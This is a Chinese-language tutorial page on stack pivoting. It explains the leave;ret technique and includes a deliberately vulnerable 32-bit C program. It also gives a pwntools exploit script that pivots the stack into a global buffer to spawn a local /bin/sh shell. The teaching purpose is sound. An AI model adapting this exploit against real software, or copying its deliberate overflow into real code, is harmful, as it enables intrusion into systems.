---
title: "栈迁移"
description: ""
lead: ""
date: 2023-06-01T21:17:56+08:00
lastmod: 2023-06-01T21:17:56+08:00
draft: false
images: []
menu:
  docs:
    parent: ""
    identifier: "stack_pivoting-28d6785c5956b294688cec7ec2408a70"
weight: 6
toc: true
---

## 0x01 介绍

很多时候由于溢出栈字节不够多，不能构造完整的payload，这时候就需要用到stack pivoting技巧来完成操作。它的核心理念在于如果我们在某个内存中可以输入完整的payload，那么我们就可以用该技巧将当前栈顶指针修改指向这段内存，然后通过一些指令来执行这段内存里的payload。

最常见的指令是`leave;ret`指令。leave是相对于函数序言的相反操作，函数序言的操作为

```cpp
 push ebp
 mov ebp, esp
```

将上一个函数栈帧的栈底指针压入到栈中，然后在将当前esp赋值给ebp即设置当前栈帧的栈底指针。leave的操作刚好相反，先将当前ebp赋值给esp，在弹出当前栈顶即恢复上一个函数栈帧的栈底指针，相当于以下指令

```cpp
 mov esp, ebp
 pop ebp
```

如果我们在溢出的是否覆盖了保存在栈里的上一个栈帧的栈底指针，通过leave指令就会将这个值保存到了ebp里，如果这时候再次执行leave指令，则会将ebp中保存的修改后的指针赋值给esp，也就是将当前栈顶指针迁移到了我们覆盖的地址+一个栈单元处。

![38e74847529c7bb77305089dad130632](images/38e74847529c7bb77305089dad130632.png) 加一个栈单元的原因是leave会在esp转移过去后先pop一个栈单元到ebp中。如果我们在指定的地址+一个栈单元处填了ROP链，那么迁移过去后执行ret指令就会开始执行ROP链。以一个例子来说

```cpp
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 char data[0x1000] = {0};// 防止其他函数操作覆盖到got之类的数据
 char p[0x20];
 ​
 void hint() {
     system("echo flag");
 }
 ​
 void run() {
     char buf[0x10];
     read(0, buf, 0x20);
     read(0, p, 0x20);
 }
 ​
 int main() {
     run();
     return 0;
 }
 // gcc stack_pivoting.c -o stack_pivoting -m32 -fno-stack-protector -no-pie
```

第一次输入虽然是栈溢出，但是它只能覆盖到函数返回地址，而且程序只有system函数，还需要自己构造`/bin/sh`字符串，第二次输入是往全局变量里写入字符串，我们可以将`/bin/sh`写入到里面并同时构造`system("/bin/sh")`的ROP链，它的结构可以为

![79afcb7258bc9b580d6c8be32b5bdd74](images/79afcb7258bc9b580d6c8be32b5bdd74.png)

`/bin/sh\x00`在末尾的目的是为了防止在解析system函数实际地址的时候被覆盖掉导致无法执行 我们通过栈溢出覆盖上一个栈帧的栈底指针为这里的system@plt-4的位置，然后将函数返回地址覆盖为leave指令的地址，最后执行完两次leave后esp就迁移到了system@plt的位置，这时候再执行ret指令，就会执行`system("/bin/sh")`的ROP链了。我们可以写出攻击脚本为

```python
 from pwn import*
 context.log_level = 'debug'
 o = process("./stack_pivoting")
 system_plt = 0x8048310
 p = 0x804b040
 leave_ret = 0x8048482
 payload = b'a'*0x18 + p32(p-4) + p32(leave_ret)
 o.send(payload)
 payload = p32(system_plt) + p32(p+12)*2 + b"/bin/sh\x00"
 o.sendline(payload)
 o.interactive()
```

![7d263d36c1630a0ce955c35cbb7c90e6](images/7d263d36c1630a0ce955c35cbb7c90e6.png)  

栈迁移除了可以迁移到bss，还可以迁移到很多地方，只要你有地址就可以尝试迁移，比如栈或者堆
